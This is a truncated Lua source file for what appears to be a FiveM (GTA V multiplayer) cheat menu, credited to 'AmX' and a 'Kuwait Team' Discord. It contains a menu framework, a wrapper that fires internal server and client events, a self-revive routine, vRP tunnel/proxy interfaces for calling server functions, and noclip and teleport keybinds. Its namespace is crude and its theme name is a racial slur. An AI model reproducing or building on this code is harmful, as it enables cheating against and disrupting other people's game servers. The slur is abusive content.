
IhadSexWithMyStepMother = {}
IhadSexWithMyStepMother.debug = false;
local a = {}
local b = {
	up = 172,
	down = 173,
	left = 174,
	right = 175,
	select = 191,
	back = 202
}
local c = 0;
local d = nil;
local e = nil;
local f = 0.11;
local g = 0.5;
local h = 2;
local j = 0.03;
local k = 1.0;
local l = 0.038;
local m = 0;
local n = 0.365;
local o = 0.005;
local p = 0.005;
local function q(r)
	if IhadSexWithMyStepMother.debug then
		Citizen.Trace("[IhadSexWithMyStepMother] " .. tostring(r))
	end
end;
function ReviveKubca()
	local s = GetEntityCoords(PlayerPedId())
	local t = {
		x = math.round(s.x, 1),
		y = math.round(s.y, 1),
		z = math.round(s.z, 1)
	}
	respawnPed(PlayerPedId(), t, 0)
	StopScreenEffect("DeathFailOut")
end;
function respawnPed(u, t, v)
	SetEntityCoordsNoOffset(u, t.x, t.y, t.z, false, false, false, true)
	NetworkResurrectLocalPlayer(t.x, t.y, t.z, v, true, false)
	SetPlayerInvincible(u, false)
	TSE(false, "playerSpawned", t.x, t.y, t.z)
	ClearPedBloodDamage(u)
end;
function TSE(w, A, ...)
	local B = msgpack.pack({
		...
	})
	if w then
		TriggerServerEventInternal(A, B, B:len())
	else
		TriggerEventInternal(A, B, B:len())
	end
end;
function math.round(C, D)
	return tonumber(string.format("%." .. (D or 0) .. "f", C))
end;
local function E(u, F, G)
	if u and a[u] then
		a[u][F] = G;
		q(u .. " menu property changed: { " .. tostring(F) .. ", " .. tostring(G) .. " }")
	end
end;
local function H(u)
	if u and a[u] then
		return a[u].visible
	else
		return false
	end
end;
local function I(u, J, K)
	if u and a[u] then
		E(u, "visible", J)
		if not K and a[u] then
			E(u, "currentOption", 1)
		end;
		if J then
			if u ~= e and H(e) then
				I(e, false)
			end;
			e = u
		end
	end
end;
local function L(r, x, y, M, N, O, P, Q, R)
	SetTextColour(N.r, N.g, N.b, N.a)
	RegisterFontFile('A9eelsh')
    fontId = RegisterFontId('A9eelsh')
    SetTextFont(fontId)
	SetTextScale(O, O)
	if Q then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end;
	if a[e] then
		if P then
			SetTextCentre(P)
		elseif R then
			SetTextWrap(a[e].x, a[e].x + a[e].width - o)
			SetTextRightJustify(true)
		end
	end;
	BeginTextCommandDisplayText("STRING")
	AddTextComponentSubstringPlayerName(r)
	EndTextCommandDisplayText(x, y)
end;
local function S(x, y, T, U, N)
	DrawRect(x, y, T, U, N.r, N.g, N.b, N.a)
end;
local function V()
	if a[e] then
		local x = a[e].x + a[e].width / 2;
		local W = a[e].x + a[e].width * g;
		local y = a[e].y + f * 1 / h;
		if a[e].titleBackgroundSprite then
			DrawSprite(a[e].titleBackgroundSprite.dict, a[e].titleBackgroundSprite.name, x, y, a[e].width, f, 0., 255, 255, 255, 255)
		else
			S(x, y, a[e].width, f, a[e].titleBackgroundColor)
		end;
		L(a[e].title, W, y - f / 2 + j, a[e].titleFont, a[e].titleColor, k, true)
	end
end;
local X = {}
local function Y(Z, _, a0, a1, T, U, a2, a3, a4, a5, a6)
	local a7 = GetAspectRatio(true)
	local a8 = tostring(_)
	local a9 = 10 ^ 3;
	local aa = math.floor;
	if not X[a8] then
		X[a8] = {}
		local ab = GetTextureResolution(Z, _)
		X[a8].ratio = ab[2] / ab[1]
		X[a8].height = aa(T * X[a8].ratio * a7 * a9 + 0.5) / a9;
		DrawSprite(Z, _, a0, a1, T, X[a8].height, a2, a3, a4, a5, a6)
	end;
	DrawSprite(Z, _, a0, a1, T, X[a8].height, a2, a3, a4, a5, a6)
end;
local function ac()
	if a[e] then
		local x = a[e].x + a[e].width / 2;
		local y = a[e].y + f + l / 2;
		local ad = 0.0025;
		local ae = 0.004;
		local af = 0.20;
		local ag = af / 4;
		local ah = {
			r = a[e].titleBackgroundColor.r,
			g = a[e].titleBackgroundColor.g,
			b = a[e].titleBackgroundColor.b,
			a = 255
		}
		S(x, y, a[e].width, l, a[e].subTitleBackgroundColor)
		L(a[e].subTitle, a[e].x + o, y - l / 2 + p, m, ah, n, false)
		AddReplaceTexture("shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "meows", "woof")
		DrawSprite("meows", "woof", x, y - 0.025, a[e].width, l + 0.05, 0, 255, 255, 255, 255)
		if c > a[e].maxOptionCount then
			L(tostring(a[e].currentOption) .. " / " .. tostring(c), a[e].x + a[e].width, y - l / 2 + p, m, ah, n, false, false, true)
		end
	end
end;
local ai = CreateRuntimeTxd("meows")
local aj = CreateDui("https://cdn.discordapp.com/attachments/938167839305662464/952263244280635493/standard_7.gif", 468, 60)
local ak = GetDuiHandle(aj)
local al = CreateRuntimeTextureFromDuiHandle(ai, "woof", ak)
local function am(r, an)
	local x = a[e].x + a[e].width / 2;
	local ao = nil;
	if a[e].currentOption <= a[e].maxOptionCount and c <= a[e].maxOptionCount then
		ao = c
	elseif c > a[e].currentOption - a[e].maxOptionCount and c <= a[e].currentOption then
		ao = c - (a[e].currentOption - a[e].maxOptionCount)
	end;
	if ao then
		local y = a[e].y + f + l + l * ao - l / 2;
		local ap = nil;
		local aq = nil;
		local ar = nil;
		local Q = false;
		if a[e].currentOption == c then
			ap = a[e].menuFocusBackgroundColor;
			aq = a[e].menuFocusTextColor;
			ar = a[e].menuFocusTextColor
		else
			ap = a[e].menuBackgroundColor;
			aq = a[e].menuTextColor;
			ar = a[e].menuSubTextColor;
			Q = true
		end;
		S(x, y, a[e].width, l, ap)
		L(r, a[e].x + o, y - l / 2 + p, m, aq, n, false, Q)
		if an then
			L(an, a[e].x + o, y - l / 2 + p, m, ar, n, false, Q, true)
		end
	end
end;
function IhadSexWithMyStepMother.CreateMenu(u, as)
	a[u] = {}
	a[u].title = as;
	a[u].subTitle = "INTERACTION MENU"
	a[u].visible = false;
	a[u].previousMenu = nil;
	a[u].aboutToBeClosed = false;
	a[u].x = 0.0175;
	a[u].y = 0.025;
	a[u].width = 0.23;
	a[u].currentOption = 1;
	a[u].maxOptionCount = 10;
	a[u].titleFont = 0;
	a[u].titleColor = {
		r = 19,
		g = 22,
		b = 59,
		a = 255
	}
	a[u].titleBackgroundColor = {
		r = 19,
		g = 22,
		b = 59,
		a = 255
	}
	a[u].titleBackgroundSprite = nil;
	a[u].menuTextColor = {
		r = 255,
		g = 255,
		b = 255,
		a = 255
	}
	a[u].menuSubTextColor = {
		r = 19,
		g = 22,
		b = 59,
		a = 255
	}
	a[u].menuFocusTextColor = {
		r = 20,
		g = 30,
		b = 138,
		a = 255
	}
	a[u].menuFocusBackgroundColor = {
		r = 24,
		g = 7,
		b = 255,
		a = 255
	}
	a[u].menuBackgroundColor = {
		r = 0,
		g = 23,
		b = 255,
		a = 160
	}
	a[u].subTitleBackgroundColor = {
		r = a[u].menuBackgroundColor.r,
		g = a[u].menuBackgroundColor.g,
		b = a[u].menuBackgroundColor.b,
		a = 255
	}
	a[u].buttonPressedSound = {
		name = "SELECT",
		set = "HUD_FRONTEND_DEFAULT_SOUNDSET"
	}
	q(tostring(u) .. " menu created")
end;
function IhadSexWithMyStepMother.CreateSubMenu(u, at, au)
	if a[at] then
		IhadSexWithMyStepMother.CreateMenu(u, a[at].title)
		if au then
			E(u, "subTitle", string.upper(au))
		else
			E(u, "subTitle", string.upper(a[at].subTitle))
		end;
		E(u, "previousMenu", at)
		E(u, "x", a[at].x)
		E(u, "y", a[at].y)
		E(u, "maxOptionCount", a[at].maxOptionCount)
		E(u, "titleFont", a[at].titleFont)
		E(u, "titleColor", a[at].titleColor)
		E(u, "titleBackgroundColor", a[at].titleBackgroundColor)
		E(u, "titleBackgroundSprite", a[at].titleBackgroundSprite)
		E(u, "menuTextColor", a[at].menuTextColor)
		E(u, "menuSubTextColor", a[at].menuSubTextColor)
		E(u, "menuFocusTextColor", a[at].menuFocusTextColor)
		E(u, "menuFocusBackgroundColor", a[at].menuFocusBackgroundColor)
		E(u, "menuBackgroundColor", a[at].menuBackgroundColor)
		E(u, "subTitleBackgroundColor", a[at].subTitleBackgroundColor)
	else
		q("Failed to create " .. tostring(u) .. " submenu: " .. tostring(at) .. " parent menu doesn't exist")
	end
end;
function IhadSexWithMyStepMother.CurrentMenu()
	return e
end;
function IhadSexWithMyStepMother.OpenMenu(u)
	if u and a[u] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		I(u, true)
		q(tostring(u) .. " menu opened")
	else
		q("Failed to open " .. tostring(u) .. " menu: it doesn't exist")
	end
end;
function IhadSexWithMyStepMother.IsMenuOpened(u)
	return H(u)
end;
function IhadSexWithMyStepMother.IsAnyMenuOpened()
	for u, av in pairs(a) do
		if H(u) then
			return true
		end
	end;
	return false
end;
function IhadSexWithMyStepMother.IsMenuAboutToBeClosed()
	if a[e] then
		return a[e].aboutToBeClosed
	else
		return false
	end
end;
function IhadSexWithMyStepMother.CloseMenu()
	if a[e] then
		if a[e].aboutToBeClosed then
			a[e].aboutToBeClosed = false;
			I(e, false)
			q(tostring(e) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			c = 0;
			e = nil;
			d = nil
		else
			a[e].aboutToBeClosed = true;
			q(tostring(e) .. " menu about to be closed")
		end
	end
end;
function IhadSexWithMyStepMother.Button(r, an)
	local aw = r;
	if an then
		aw = "{ " .. tostring(aw) .. ", " .. tostring(an) .. " }"
	end;
	if a[e] then
		c = c + 1;
		local ax = a[e].currentOption == c;
		am(r, an)
		if ax then
			if d == b.select then
				PlaySoundFrontend(-1, a[e].buttonPressedSound.name, a[e].buttonPressedSound.set, true)
				q(aw .. " button pressed")
				return true
			elseif d == b.left or d == b.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end;
		return false
	else
		q("Failed to create " .. aw .. " button: " .. tostring(e) .. " menu doesn't exist")
		return false
	end
end;
function IhadSexWithMyStepMother.MenuButton(r, u)
	if a[u] then
		if IhadSexWithMyStepMother.Button(r .. themecolor .. "" .. themearrow) then
			I(e, false)
			I(u, true, true)
			return true
		end
	else
		q("Failed to create " .. tostring(r) .. " menu button: " .. tostring(u) .. " submenu doesn't exist")
	end;
	return false
end;
function IhadSexWithMyStepMother.CheckBox(r, ay, az, aA, aB)
	if not az then
		az = "Off"
	end;
	if not aA then
		aA = "On"
	end;
	if IhadSexWithMyStepMother.Button(r, ay and aA or az) then
		ay = not ay;
		q(tostring(r) .. " checkbox changed to " .. tostring(ay))
		if aB then
			aB(ay)
		end;
		return true
	end;
	return false
end;
function IhadSexWithMyStepMother.ComboBox(r, aC, aD, aE, aB)
	local aF = #aC;
	local aG = aC[aD]
	local ax = a[e].currentOption == c + 1;
	if aF > 1 and ax then
		aG = tostring(aG)
	end;
	if IhadSexWithMyStepMother.Button(r, aG) then
		aE = aD;
		aB(aD, aE)
		return true
	elseif ax then
		if d == b.left then
			if aD > 1 then
				aD = aD - 1
			else
				aD = aF
			end
		elseif d == b.right then
			if aD < aF then
				aD = aD + 1
			else
				aD = 1
			end
		end
	else
		aD = aE
	end;
	aB(aD, aE)
	return false
end;
function IhadSexWithMyStepMother.Display()
	if H(e) then
		if a[e].aboutToBeClosed then
			IhadSexWithMyStepMother.CloseMenu()
		else
			ClearAllHelpMessages()
			V()
			ac()
			d = nil;
			if IsDisabledControlJustReleased(1, b.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				if a[e].currentOption < c then
					a[e].currentOption = a[e].currentOption + 1
				else
					a[e].currentOption = 1
				end
			elseif IsDisabledControlJustReleased(1, b.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				if a[e].currentOption > 1 then
					a[e].currentOption = a[e].currentOption - 1
				else
					a[e].currentOption = c
				end
			elseif IsDisabledControlJustReleased(1, b.left) then
				d = b.left
			elseif IsDisabledControlJustReleased(1, b.right) then
				d = b.right
			elseif IsDisabledControlJustReleased(1, b.select) then
				d = b.select
			elseif IsDisabledControlJustReleased(1, b.back) then
				if a[a[e].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					I(a[e].previousMenu, true)
				else
					IhadSexWithMyStepMother.CloseMenu()
				end
			end;
			c = 0
		end
	end
end;
function IhadSexWithMyStepMother.SetMenuWidth(u, T)
	E(u, "width", T)
end;
function IhadSexWithMyStepMother.SetMenuX(u, x)
	E(u, "x", x)
end;
function IhadSexWithMyStepMother.SetMenuY(u, y)
	E(u, "y", y)
end;
function IhadSexWithMyStepMother.SetMenuMaxOptionCountOnScreen(u, aH)
	E(u, "maxOptionCount", aH)
end;
function IhadSexWithMyStepMother.SetTitle(u, as)
	E(u, "title", as)
end;
function IhadSexWithMyStepMother.SetTitleColor(u, aI, aJ, aK, aL)
	E(u, "titleColor", {
		["r"] = aI,
		["g"] = aJ,
		["b"] = aK,
		["a"] = aL or a[u].titleColor.a
	})
end;
function IhadSexWithMyStepMother.SetTitleBackgroundColor(u, aI, aJ, aK, aL)
	E(u, "titleBackgroundColor", {
		["r"] = aI,
		["g"] = aJ,
		["b"] = aK,
		["a"] = aL or a[u].titleBackgroundColor.a
	})
end;
function IhadSexWithMyStepMother.SetTitleBackgroundSprite(u, Z, _)
	RequestStreamedTextureDict(Z)
	E(u, "titleBackgroundSprite", {
		dict = Z,
		name = _
	})
end;
function IhadSexWithMyStepMother.SetSubTitle(u, r)
	E(u, "subTitle", string.upper(r))
end;
function IhadSexWithMyStepMother.SetMenuBackgroundColor(u, aI, aJ, aK, aL)
	E(u, "menuBackgroundColor", {
		["r"] = aI,
		["g"] = aJ,
		["b"] = aK,
		["a"] = aL or a[u].menuBackgroundColor.a
	})
end;
function IhadSexWithMyStepMother.SetMenuTextColor(u, aI, aJ, aK, aL)
	E(u, "menuTextColor", {
		["r"] = aI,
		["g"] = aJ,
		["b"] = aK,
		["a"] = aL or a[u].menuTextColor.a
	})
end;
function IhadSexWithMyStepMother.SetMenuSubTextColor(u, aI, aJ, aK, aL)
	E(u, "menuSubTextColor", {
		["r"] = aI,
		["g"] = aJ,
		["b"] = aK,
		["a"] = aL or a[u].menuSubTextColor.a
	})
end;
function IhadSexWithMyStepMother.SetMenuFocusColor(u, aI, aJ, aK, aL)
	E(u, "menuFocusColor", {
		["r"] = aI,
		["g"] = aJ,
		["b"] = aK,
		["a"] = aL or a[u].menuFocusColor.a
	})
end;
function IhadSexWithMyStepMother.SetMenuButtonPressedSound(u, aM, aN)
	E(u, "buttonPressedSound", {
		["name"] = aM,
		["set"] = aN
	})
end;
Tools = {}
local aO = {}
function Tools.newIDGenerator()
	local aI = setmetatable({}, {
		__index = aO
	})
	aI:construct()
	return aI
end;
function aO:construct()
	self:clear()
end;
function aO:clear()
	self.max = 0;
	self.ids = {}
end;
function aO:gen()
	if #self.ids > 0 then
		return table.remove(self.ids)
	else
		local aI = self.max;
		self.max = self.max + 1;
		return aI
	end
end;
function aO:free(u)
	table.insert(self.ids, u)
end;
Tunnel = {}
local function aP(aQ, aR)
	local aS = getmetatable(aQ)
	local aT = aS.name;
	local aU = aS.tunnel_ids;
	local aV = aS.tunnel_callbacks;
	local aW = aS.identifier;
	local aX = function(B, aB)
		if B == nil then
			B = {}
		end;
		if type(aB) == "function" then
			local aY = aU:gen()
			aV[aY] = aB;
			TriggerServerEvent(aT .. ":tunnel_req", aR, B, aW, aY)
		else
			TriggerServerEvent(aT .. ":tunnel_req", aR, B, "", -1)
		end
	end;
	aQ[aR] = aX;
	return aX
end;
function Tunnel.bindInterface(aM, aZ)
	RegisterNetEvent(aM .. ":tunnel_req")
	AddEventHandler(aM .. ":tunnel_req", function(a_, B, aW, aY)
		local b0 = aZ[a_]
		local b1 = false;
		local b2 = {}
		if type(b0) == "function" then
			TUNNEL_DELAYED = function()
				b1 = true;
				return function(b2)
					b2 = b2 or {}
					if aY >= 0 then
						TriggerServerEvent(aM .. ":" .. aW .. ":tunnel_res", aY, b2)
					end
				end
			end;
			b2 = {
				b0(table.unpack(B))
			}
		end;
		if not b1 and aY >= 0 then
			TriggerServerEvent(aM .. ":" .. aW .. ":tunnel_res", aY, b2)
		end
	end)
end;
function Tunnel.getInterface(aM, aW)
	local aU = Tools.newIDGenerator()
	local aV = {}
	local aI = setmetatable({}, {
		__index = aP,
		name = aM,
		tunnel_ids = aU,
		tunnel_callbacks = aV,
		identifier = aW
	})
	RegisterNetEvent(aM .. ":" .. aW .. ":tunnel_res")
	AddEventHandler(aM .. ":" .. aW .. ":tunnel_res", function(aY, B)
		local aB = aV[aY]
		if aB ~= nil then
			aU:free(aY)
			aV[aY] = nil;
			aB(table.unpack(B))
		end
	end)
	return aI
end;
Proxy = {}
local b3 = {}
local function b4(b5)
	b3 = b5
end;
local function b6(aQ, aR)
	local aT = getmetatable(aQ).name;
	local aX = function(B, aB)
		if B == nil then
			B = {}
		end;
		TriggerEvent(aT .. ":proxy", aR, B, b4)
		return table.unpack(b3)
	end;
	aQ[aR] = aX;
	return aX
end;
function Proxy.addInterface(aM, aQ)
	AddEventHandler(aM .. ":proxy", function(a_, B, aB)
		local b0 = aQ[a_]
		if type(b0) == "function" then
			aB({
				b0(table.unpack(B))
			})
		else
		end
	end)
end;
function Proxy.getInterface(aM)
	local aI = setmetatable({}, {
		__index = b6,
		name = aM
	})
	return aI
end;
local b7 = {
	{
		"~b~AmX#4083 ",
		"~p~Discord"
	},
	{
		"~r~AmX",
		"~r~𝑨𝑴𝑿 lol don't try to change",
		"~g~Developers"
	},
	{
		"~v~Kuwait Team",
		"~r~discord.gg/pcr",
		"~v~Kuwait Team"
	},
}
version = "~s~ 6~r~.1"
theme = "StupidNiggaPaster"
themes = {
	"StupidNiggaPaster"
}
mpMessage = false;
menuKeybind = "B"
menuKeybind2 = ","
noclipKeybind = "F9"
teleportKeyblind = "F7"
fixvaiculoKeyblind = "F10"
startMessage = "~g~BY : ~r~AmX"
subMessage = "~r~AlenZi"
subMessage1 = "~b~DISCORD : discord : AmX#4083"
motd2 = "Key ~r~*" .. teleportKeyblind .. "* ~w~TeleportToWaypoint"
motd = "Key ~r~*" .. noclipKeybind .. "* ~w~Active noclip!"
motd5 = "Key ~r~*" .. fixvaiculoKeyblind .. "* ~w~Fix Car"
motd3 = "~r~<3"
local b8 = {
	"shopui_title_graphics_franklin",
	"mparrow"
}
local function b9()
	for i = 1, #b8 do
		RequestStreamedTextureDict(b8[i])
	end
end;
b9()
FiveM = {}
do
	FiveM.Notify = function(r, type)
		if type == nil then
			type = NotificationType.None
		end;
		SetNotificationTextEntry("STRING")
		if type == NotificationType.Info then
			AddTextComponentString("~b~~h~Info~h~~s~: " .. r)
		elseif type == NotificationType.Error then
			AddTextComponentString("~r~~h~Error~h~~s~: " .. r)
		elseif type == NotificationType.Alert then
			AddTextComponentString("~y~~h~Alert~h~~s~: " .. r)
		elseif type == NotificationType.Success then
			AddTextComponentString("~g~~h~Success~h~~s~: " .. r)
		else
			AddTextComponentString(r)
		end;
		DrawNotification(false, false)
	end;
	FiveM.Subtitle = function(ba, bb, bc)
		if bb == nil then
			bb = 2500
		end;
		if bc == nil then
			bc = true
		end;
		ClearPrints()
		SetTextEntry_2("STRING")
		for i = 1, ba:len(), 99 do
			AddTextComponentString(string.sub(ba, i, i + 99))
		end;
		DrawSubtitleTimed(bb, bc)
	end;
	FiveM.GetKeyboardInput = function(bd, be, bf)
		AddTextEntry("FMMC_KEY_TIP1", bd .. ":")
		DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", be, "", "", "", bf)
		local bg = true;
		while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
			Citizen.Wait(0)
		end;
		if UpdateOnscreenKeyboard() ~= 2 then
			local bh = GetOnscreenKeyboardResult()
			Citizen.Wait(500)
			bg = false;
			return bh
		else
			Citizen.Wait(500)
			bg = false;
			return nil
		end
	end;
	FiveM.GetVehicleProperties = function(bi)
		local bj, bk = GetVehicleColours(bi)
		local bl, bm = GetVehicleExtraColours(bi)
		local bn = {}
		for u = 0, 12 do
			if DoesExtraExist(bi, u) then
				local bo = IsVehicleExtraTurnedOn(bi, u) == 1;
				bn[tostring(u)] = bo
			end
		end;
		return {
			model = GetEntityModel(bi),
			plate = math.trim(GetVehicleNumberPlateText(bi)),
			plateIndex = GetVehicleNumberPlateTextIndex(bi),
			health = GetEntityMaxHealth(bi),
			dirtLevel = GetVehicleDirtLevel(bi),
			color1 = bj,
			color2 = bk,
			pearlescentColor = bl,
			wheelColor = bm,
			wheels = GetVehicleWheelType(bi),
			windowTint = GetVehicleWindowTint(bi),
			neonEnabled = {
				IsVehicleNeonLightEnabled(bi, 0),
				IsVehicleNeonLightEnabled(bi, 1),
				IsVehicleNeonLightEnabled(bi, 2),
				IsVehicleNeonLightEnabled(bi, 3)
			},
			extras = bn,
			neonColor = table.pack(GetVehicleNeonLightsColour(bi)),
			tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(bi)),
			modSpoilers = GetVehicleMod(bi, 0),
			modFrontBumper = GetVehicleMod(bi, 1),
			modRearBumper = GetVehicleMod(bi, 2),
			modSideSkirt = GetVehicleMod(bi, 3),
			modExhaust = GetVehicleMod(bi, 4),
			modFrame = GetVehicleMod(bi, 5),
			modGrille = GetVehicleMod(bi, 6),
			modHood = GetVehicleMod(bi, 7),
			modFender = GetVehicleMod(bi, 8),
			modRightFender = GetVehicleMod(bi, 9),
			modRoof = GetVehicleMod(bi, 10),
			modEngine = GetVehicleMod(bi, 11),
			modBrakes = GetVehicleMod(bi, 12),
			modTransmission = GetVehicleMod(bi, 13),
			modHorns = GetVehicleMod(bi, 14),
			modSuspension = GetVehicleMod(bi, 15),
			modArmor = GetVehicleMod(bi, 16),
			modTurbo = IsToggleModOn(bi, 18),
			modSmokeEnabled = IsToggleModOn(bi, 20),
			modXenon = IsToggleModOn(bi, 22),
			modFrontWheels = GetVehicleMod(bi, 23),
			modBackWheels = GetVehicleMod(bi, 24),
			modPlateHolder = GetVehicleMod(bi, 25),
			modVanityPlate = GetVehicleMod(bi, 26),
			modTrimA = GetVehicleMod(bi, 27),
			modOrnaments = GetVehicleMod(bi, 28),
			modDashboard = GetVehicleMod(bi, 29),
			modDial = GetVehicleMod(bi, 30),
			modDoorSpeaker = GetVehicleMod(bi, 31),
			modSeats = GetVehicleMod(bi, 32),
			modSteeringWheel = GetVehicleMod(bi, 33),
			modShifterLeavers = GetVehicleMod(bi, 34),
			modAPlate = GetVehicleMod(bi, 35),
			modSpeakers = GetVehicleMod(bi, 36),
			modTrunk = GetVehicleMod(bi, 37),
			modHydrolic = GetVehicleMod(bi, 38),
			modEngineBlock = GetVehicleMod(bi, 39),
			modAirFilter = GetVehicleMod(bi, 40),
			modStruts = GetVehicleMod(bi, 41),
			modArchCover = GetVehicleMod(bi, 42),
			modAerials = GetVehicleMod(bi, 43),
			modTrimB = GetVehicleMod(bi, 44),
			modTank = GetVehicleMod(bi, 45),
			modWindows = GetVehicleMod(bi, 46),
			modLivery = GetVehicleLivery(bi)
		}
	end;
	FiveM.SetVehicleProperties = function(bi, bp)
		SetVehicleModKit(bi, 0)
		if bp.plate ~= nil then
			SetVehicleNumberPlateText(bi, bp.plate)
		end;
		if bp.plateIndex ~= nil then
			SetVehicleNumberPlateTextIndex(bi, bp.plateIndex)
		end;
		if bp.health ~= nil then
			SetEntityHealth(bi, bp.health)
		end;
		if bp.dirtLevel ~= nil then
			SetVehicleDirtLevel(bi, bp.dirtLevel)
		end;
		if bp.color1 ~= nil then
			local bj, bk = GetVehicleColours(bi)
			SetVehicleColours(bi, bp.color1, bk)
		end;
		if bp.color2 ~= nil then
			local bj, bk = GetVehicleColours(bi)
			SetVehicleColours(bi, bj, bp.color2)
		end;
		if bp.pearlescentColor ~= nil then
			local bl, bm = GetVehicleExtraColours(bi)
			SetVehicleExtraColours(bi, bp.pearlescentColor, bm)
		end;
		if bp.wheelColor ~= nil then
			local bl, bm = GetVehicleExtraColours(bi)
			SetVehicleExtraColours(bi, bl, bp.wheelColor)
		end;
		if bp.wheels ~= nil then
			SetVehicleWheelType(bi, bp.wheels)
		end;
		if bp.windowTint ~= nil then
			SetVehicleWindowTint(bi, bp.windowTint)
		end;
		if bp.neonEnabled ~= nil then
			SetVehicleNeonLightEnabled(bi, 0, bp.neonEnabled[1])
			SetVehicleNeonLightEnabled(bi, 1, bp.neonEnabled[2])
			SetVehicleNeonLightEnabled(bi, 2, bp.neonEnabled[3])
			SetVehicleNeonLightEnabled(bi, 3, bp.neonEnabled[4])
		end;
		if bp.extras ~= nil then
			for u, bq in pairs(bp.extras) do
				if bq then
					SetVehicleExtra(bi, tonumber(u), 0)
				else
					SetVehicleExtra(bi, tonumber(u), 1)
				end
			end
		end;
		if bp.neonColor ~= nil then
			SetVehicleNeonLightsColour(bi, bp.neonColor[1], bp.neonColor[2], bp.neonColor[3])
		end;
		if bp.modSmokeEnabled ~= nil then
			ToggleVehicleMod(bi, 20, true)
		end;
		if bp.tyreSmokeColor ~= nil then
			SetVehicleTyreSmokeColor(bi, bp.tyreSmokeColor[1], bp.tyreSmokeColor[2], bp.tyreSmokeColor[3])
		end;
		if bp.modSpoilers ~= nil then
			SetVehicleMod(bi, 0, bp.modSpoilers, false)
		end;
		if bp.modFrontBumper ~= nil then
			SetVehicleMod(bi, 1, bp.modFrontBumper, false)
		end;
		if bp.modRearBumper ~= nil then
			SetVehicleMod(bi, 2, bp.modRearBumper, false)
		end;
		if bp.modSideSkirt ~= nil then
			SetVehicleMod(bi, 3, bp.modSideSkirt, false)
		end;
		if bp.modExhaust ~= nil then
			SetVehicleMod(bi, 4, bp.modExhaust, false)
		end;
		if bp.modFrame ~= nil then
			SetVehicleMod(bi, 5, bp.modFrame, false)
		end;
		if bp.modGrille ~= nil then
			SetVehicleMod(bi, 6, bp.modGrille, false)
		end;
		if bp.modHood ~= nil then
			SetVehicleMod(bi, 7, bp.modHood, false)
		end;
		if bp.modFender ~= nil then
			SetVehicleMod(bi, 8, bp.modFender, false)
		end;
		if bp.modRightFender ~= nil then
			SetVehicleMod(bi, 9, bp.modRightFender, false)
		end;
		if bp.modRoof ~= nil then
			SetVehicleMod(bi, 10, bp.modRoof, false)
		end;
		if bp.modEngine ~= nil then
			SetVehicleMod(bi, 11, bp.modEngine, false)
		end;
		if bp.modBrakes ~= nil then
			SetVehicleMod(bi, 12, bp.modBrakes, false)
		end;
		if bp.modTransmission ~= nil then
			SetVehicleMod(bi, 13, bp.modTransmission, false)
		end;
		if bp.modHorns ~= nil then
			SetVehicleMod(bi, 14, bp.modHorns, false)
		end;
		if bp.modSuspension ~= nil then
			SetVehicleMod(bi, 15, bp.modSuspension, false)
		end;
		if bp.modArmor ~= nil then
			SetVehicleMod(bi, 16, bp.modArmor, false)
		end;
		if bp.modTurbo ~= nil then
			ToggleVehicleMod(bi, 18, bp.modTurbo)
		end;
		if bp.modXenon ~= nil then
			ToggleVehicleMod(bi, 22, bp.modXenon)
		end;
		if bp.modFrontWheels ~= nil then
			SetVehicleMod(bi, 23, bp.modFrontWheels, false)
		end;
		if bp.modBackWheels ~= nil then
			SetVehicleMod(bi, 24, bp.modBackWheels, false)
		end;
		if bp.modPlateHolder ~= nil then
			SetVehicleMod(bi, 25, bp.modPlateHolder, false)
		end;
		if bp.modVanityPlate ~= nil then
			SetVehicleMod(bi, 26, bp.modVanityPlate, false)
		end;
		if bp.modTrimA ~= nil then
			SetVehicleMod(bi, 27, bp.modTrimA, false)
		end;
		if bp.modOrnaments ~= nil then
			SetVehicleMod(bi, 28, bp.modOrnaments, false)
		end;
		if bp.modDashboard ~= nil then
			SetVehicleMod(bi, 29, bp.modDashboard, false)
		end;
		if bp.modDial ~= nil then
			SetVehicleMod(bi, 30, bp.modDial, false)
		end;
		if bp.modDoorSpeaker ~= nil then
			SetVehicleMod(bi, 31, bp.modDoorSpeaker, false)
		end;
		if bp.modSeats ~= nil then
			SetVehicleMod(bi, 32, bp.modSeats, false)
		end;
		if bp.modSteeringWheel ~= nil then
			SetVehicleMod(bi, 33, bp.modSteeringWheel, false)
		end;
		if bp.modShifterLeavers ~= nil then
			SetVehicleMod(bi, 34, bp.modShifterLeavers, false)
		end;
		if bp.modAPlate ~= nil then
			SetVehicleMod(bi, 35, bp.modAPlate, false)
		end;
		if bp.modSpeakers ~= nil then
			SetVehicleMod(bi, 36, bp.modSpeakers, false)
		end;
		if bp.modTrunk ~= nil then
			SetVehicleMod(bi, 37, bp.modTrunk, false)
		end;
		if bp.modHydrolic ~= nil then
			SetVehicleMod(bi, 38, bp.modHydrolic, false)
		end;
		if bp.modEngineBlock ~= nil then
			SetVehicleMod(bi, 39, bp.modEngineBlock, false)
		end;
		if bp.modAirFilter ~= nil then
			SetVehicleMod(bi, 40, bp.modAirFilter, false)
		end;
		if bp.modStruts ~= nil then
			SetVehicleMod(bi, 41, bp.modStruts, false)
		end;
		if bp.modArchCover ~= nil then
			SetVehicleMod(bi, 42, bp.modArchCover, false)
		end;
		if bp.modAerials ~= nil then
			SetVehicleMod(bi, 43, bp.modAerials, false)
		end;
		if bp.modTrimB ~= nil then
			SetVehicleMod(bi, 44, bp.modTrimB, false)
		end;
		if bp.modTank ~= nil then
			SetVehicleMod(bi, 45, bp.modTank, false)
		end;
		if bp.modWindows ~= nil then
			SetVehicleMod(bi, 46, bp.modWindows, false)
		end;
		if bp.modLivery ~= nil then
			SetVehicleMod(bi, 48, bp.modLivery, false)
			SetVehicleLivery(bi, bp.modLivery)
		end
	end;
	FiveM.DeleteVehicle = function(bi)
